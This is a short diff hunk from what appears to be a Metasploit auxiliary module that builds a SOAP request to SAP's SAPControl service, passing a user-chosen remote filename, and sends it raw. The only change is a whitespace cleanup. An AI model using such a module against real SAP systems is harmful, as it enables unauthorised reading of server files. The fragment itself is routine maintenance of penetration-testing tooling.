@@ -97,7 +97,7 @@ class Metasploit4 < Msf::Auxiliary
 		data << '<' + ns1 + ' xmlns:ns1="urn:SAPControl"><filename>' + "#{datastore['RFILE']}" + '</filename></' + ns1 + '>' + "\r\n"
 		data << '</SOAP-ENV:Body>' + "\r\n"
 		data << '</SOAP-ENV:Envelope>' + "\r\n\r\n"
-	
+
 		begin
 			res = send_request_raw({
 				'uri'      => "/#{datastore['URI']}",
